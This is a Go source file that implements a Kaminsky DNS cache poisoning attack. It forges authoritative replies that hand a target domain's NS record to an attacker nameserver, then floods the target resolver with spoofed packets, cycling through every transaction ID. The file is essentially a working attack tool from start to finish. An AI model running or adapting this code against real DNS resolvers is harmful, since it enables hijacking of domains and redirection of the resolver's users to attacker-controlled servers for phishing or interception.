package go_kaminsky

import (
	"crypto/rand"
	"fmt"
	"math"
	"net"
	"time"

	"github.com/miekg/dns"
)

// randAlphanumString generates a random string of specified length using alphanumeric characters
func RandAlphanumString(length int) string {
	const alphanum = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	bytes := make([]byte, length)
	rand.Read(bytes)

	for i := range bytes {
		bytes[i] = alphanum[int(bytes[i])%len(alphanum)]
	}
	return string(bytes)
}

// Attack runs a Kaminsky DNS cache poisoning attack against the target server for the target domain
func Attack(
	attackerNS string,
	targetDomain string,
	targetServerAddr net.IP,
	spoofedAddrs []net.IP,
	duration time.Duration,
	delay time.Duration,
) error {
	const (
		randResourceLen = 7
		ttl             = 240
		dnsPort         = 53
	)

	// Generate random FQDN for target domain
	randFQDN := fmt.Sprintf("%s.%s", RandAlphanumString(randResourceLen), targetDomain)
	fmt.Printf("Will launch an attack by sending a request for %s\n", randFQDN)

	// Create DNS query message
	query := new(dns.Msg)
	query.SetQuestion(dns.Fqdn(randFQDN), dns.TypeA)
	query.Id = dns.Id()

	// Create DNS response message
	response := new(dns.Msg)
	response.SetReply(query)
	response.Authoritative = true

	// Add answer section
	response.Answer = append(response.Answer, &dns.A{
		Hdr: dns.RR_Header{
			Name:   dns.Fqdn(randFQDN),
			Rrtype: dns.TypeA,
			Class:  dns.ClassINET,
			Ttl:    0,
		},
		A: net.IPv4(127, 0, 0, 1),
	})

	// Add authority section
	response.Ns = append(response.Ns, &dns.NS{
		Hdr: dns.RR_Header{
			Name:   dns.Fqdn(targetDomain),
			Rrtype: dns.TypeNS,
			Class:  dns.ClassINET,
			Ttl:    ttl,
		},
		Ns: attackerNS,
	})

	// Send initial query
	client := new(dns.Client)
	targetAddr := fmt.Sprintf("%s:%d", targetServerAddr.String(), dnsPort)
	go client.Exchange(query, targetAddr)

	start := time.Now()

	// Launch the attack
	for time.Since(start) < duration {
		for _, addr := range spoofedAddrs {
			spoofer, err := NewSpoofer(addr, targetServerAddr, response.Len())
			if err != nil {
				return fmt.Errorf("creating spoofer: %w", err)
			}

			// Wait to allow outgoing DNS request to be sent
			time.Sleep(delay)

			if err := spamMessage(
				response,
				makeIDIterator(),
				spoofer,
				duration-time.Since(start),
			); err != nil {
				return fmt.Errorf("spamming messages: %w", err)
			}
		}
	}

	return nil
}

// makeIDIterator returns a channel that yields uint16 values from 0 to max
func makeIDIterator() <-chan uint16 {
	ch := make(chan uint16)
	go func() {
		defer close(ch)
		for i := uint16(0); i < math.MaxUint16; i++ {
			ch <- i
		}
	}()
	return ch
}

func spamMessage(
	message *dns.Msg,
	ids <-chan uint16,
	spoofer *Spoofer,
	duration time.Duration,
) error {
	start := time.Now()

	for id := range ids {
		message.Id = id
		bytes, err := message.Pack()
		if err != nil {
			return fmt.Errorf("packing DNS message: %w", err)
		}

		if err := spoofer.SendBytes(bytes); err != nil {
			return fmt.Errorf("sending spoofed packet: %w", err)
		}

		if time.Since(start) > duration {
			fmt.Printf("Stopping early after %v seconds and %d iterations\n",
				time.Since(start).Seconds(), id+1)
			break
		}
	}
	return nil
}
